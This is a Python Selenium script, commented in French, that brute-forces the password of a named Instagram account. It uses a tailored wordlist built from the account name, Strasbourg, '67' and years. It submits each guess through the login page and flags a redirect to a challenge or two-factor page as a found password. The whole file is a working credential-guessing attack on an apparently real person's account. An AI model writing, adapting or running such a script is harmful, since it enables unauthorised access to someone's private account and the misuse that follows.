import time
from selenium import webdriver
from selenium.webdriver.common.by import By

# --- Paramètres ---
username = "crush.yunus.emre"

# Liste de mots de passe à tester
passwords = [
    "crush", "yunus", "emre", "crush2010", "yunus2010", "emre2010",
    "crushyunus", "crushemre", "crushyunusemre", "yunusemre",
    "crush.yunus.emre", "CrushYunusEmre", "crush_2010", "crush_67",
    "crush_2024", "crush_stras", "strasbourgcrush", "CrushStrasbourg2010",
    "StrasbourgCrush2010", "admincrush", "crushadmin", "admin2010",
    "crush_sondage", "sondagecrush", "crushinsta", "instacrush", "crushSB",
    "SBcrush", "YEcrush", "CrushYE", "Crush_Yunus_Emre", "Crush.Yunus.Emre67",
    "Crush.Yunus.Emre2010", "yunus_emre2010", "yunusemre2010", "Crush@2010",
    "Sondage@2010", "stras2010", "stras67", "CrushStras67", "sondage2010",
    "strasbourg", "strasbourg67", "Strasbourg67", "Strasbourg_67", "stras67",
    "Stras67", "strasbourg2023", "strasbourg2024", "Stras2023", "Stras2024",
    "adminstras", "admin67", "Stras_admin", "insta67", "sondage67",
    "sondage.stras", "sondage2024", "67strasbourg!", "Strasbourg!",
    "Stras_bourg67", "StrasB67", "SBadmin", "crush2023", "crush2024",
    "Crush2024", "Crush_2024", "crush@2024", "Crush@Stras", "Crush@2024",
    "Crush_Yunus_67"
]

# --- Initialiser le navigateur ---
driver = webdriver.Chrome()
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(5)

# Accepter les cookies si nécessaire
try:
    accept = driver.find_element(By.XPATH, "//button[text()='Accepter tous les cookies']")
    accept.click()
    time.sleep(2)
except:
    pass

# --- Fonction de test de connexion ---
def try_login(password):
    try:
        username_input = driver.find_element(By.NAME, "username")
        password_input = driver.find_element(By.NAME, "password")
        username_input.clear()
        password_input.clear()
        username_input.send_keys(username)
        password_input.send_keys(password)

        submit = driver.find_element(By.XPATH, "//button[@type='submit']")
        submit.click()
        print(f"[?] Tentative avec : {password}")
        time.sleep(4)

        if "challenge" in driver.current_url or "two_factor" in driver.current_url:
            print(f"[!] Mot de passe trouvé : {password}")
            return True
        else:
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(4)
            return False
    except Exception as e:
        print(f"Erreur avec {password} : {e}")
        return False

# --- Lancement des tests ---
for pwd in passwords:
    if try_login(pwd):
        break

driver.quit()
